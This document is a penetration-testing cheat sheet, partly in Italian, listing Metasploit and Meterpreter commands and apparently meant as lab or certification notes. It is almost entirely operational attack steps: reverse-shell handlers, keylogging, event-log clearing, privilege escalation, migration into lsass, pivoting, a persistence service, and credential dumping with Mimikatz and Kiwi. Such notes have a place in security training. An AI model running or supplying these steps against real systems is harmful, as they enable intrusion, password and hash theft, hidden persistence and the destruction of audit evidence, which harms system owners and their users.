
```
### Metasploit Command

> search
> options
> set GHOST (global HOST setting)
> background o bg 

> sessions
> sessions -i 1 (Switch to session 1)
> sessions 2

Rename the session 1 meterpreter:
> sessions -n victim1 -i 1


Metasploit Reverse TCP:
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 10.10.4.2
> set LPORT 1234
> run

Starto postgresql database to store all Metasploit loot:
> /etc/init.d/postgresql start        
or
> service postgresql start && msfconsole -q


# Metasploit - Verify MSF database is connected:
> db_status


# Import nmap scan into MSF
> db_import /root/scan/nmap/windows_server_2012.xml
> hosts
> services



# Load WMAP 
> wmap
> wmap_sites -a 192.157.89.3
> wmap_targets -t http://192.167.89.3
> wmap_sites -l
> wmap_targets -l
> wmap_run -t
> wmap_run -e




# Metasploit - Keylogging
got meterpreter sessions
> echo "You Have been Hacked" > keylogging.txt 
Running keyscan_start to capture keystrokes:
meterpreter > keyscan_start


# Metasploit - Clear Event Logs
got meterpreter sessions
meterpreter > clearev

```

```
## Meterpreter Command

# Checking current user:
> getuid
> sysinfo


# Elevate High Privilege:
> getsystem 


# Migrare processo:
> ps -S explorer.exe [Explorer.exe - 2896]
> migrate 2896
oppure migro direttamente al processo 
> migrate -N lsass.exe


# Check if users is member of Administrator groups:
> net localgroup administrators


# Get Windows Shell from Meterpreter shell:
> meterpreter
> shell
[CMD shell]

# Upgrading Command Shell to Meterpreter Shells v1
> sessions -u 1

# Upgrading Command Shell to Meterpreter Shells v2:
[Command Shell session 1 opened]
> CTRL + Z     or    background
> use post/multi/manage/shell_to_meterpreter
> set SESSION 1
> set LHOST 192.136.151.2
> run
# Interact with meterpreter session by running
> sessions 2

# Upgrade the sessions to a meterpreter session:
/bin/bash -i



# MsfConsole - AutoRoute + Scanning Using Autoroute + Pivoting
Devo ruotare tutto il traffico che gira su MSfConsole utilizzando l'ip 192.125.162.2 sul quale ho stabilito una sessione meterpreter
meterpreter > ip a
meterpreter > run autoroute -s 192.125.162.2

CTRL + Z [background session]

> use auxiliary/scanner/portscan/tcp 
> set RHOSTS 192.125.162.3 
> set verbose true
> set ports 1-1000 
> exploit
[Scanned 1 of 1 hosts]
[192.125.162.3:80 TCP Open]

# MsfConsole - Pivoting
Forward the remote port 80 to local port 1234
> sessions -i 1
> portfwd add -l 1234 -p 80 -r 192.125.162.3
> portfwd list

Do not close msfconsole
> nmap -sV -Pn -p 1234 localhost




# Check the present working directory on local machine (attacker):
meterpreter > lpwd

# Check the files present in present working directory on local machine:
meterpreter > lls

# Modify file
meterpreter > edit file.txt
meterpreter > rm file
meterpreter > download file.zip
meterpreter > unzip file.zip
meterpreter > getenv PATH

# Cercare file (simile alla find - Linux)
meterpreter > search -d /usr/bin -f *ckdo* 


#Meterpreter - Maintaining Access Persistence Service [Admin/System privilege required]:
> got meterpreter sessions
> background

Install Persistence Executable Service:
By Default Metasploit use default configuration persistence:
Payload: windows/meterpreter/reverse_tcp 
LHOST: Attack IP Address. 
LPORT: 4444

> use exploit/windows/local/persistence_service
> set SESSION 1
> exploit

Start another MSFConsole to run multi handler and gain access:
> msfconsole -q 
> use exploit/multi/handler 
> set LHOST 10.10.1.2
> set PAYLOAD windows/meterpreter/reverse_tcp 
> set LPORT 4444
> exploit






### Mimikatz Dumping:

# Mimikatz: Upload on Meterpreter shell
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
> shell

Run mimikatz:
> mimikatz.exe
> lsadump::sam
> lsadump::secrets
> sekurlsa::logonPasswords



# Mimikatz - Kiwi Dumping ALL hashes:
> migrate -N lsass.exe
> hashdump


### Kiwi - Dumping:
> migrate -N lsass.exe

# Kiwi - Load Kiwi:
> load kiwi

# Kiwi - Dump Administrator NTLM hash:
> creds_all

# Kiwi - Extract All users NTLM hash:
> lsa_dump_sam

# Kiwi - Extract Syskey by dumping LSA secrets:
> lsa_dump_secrets








```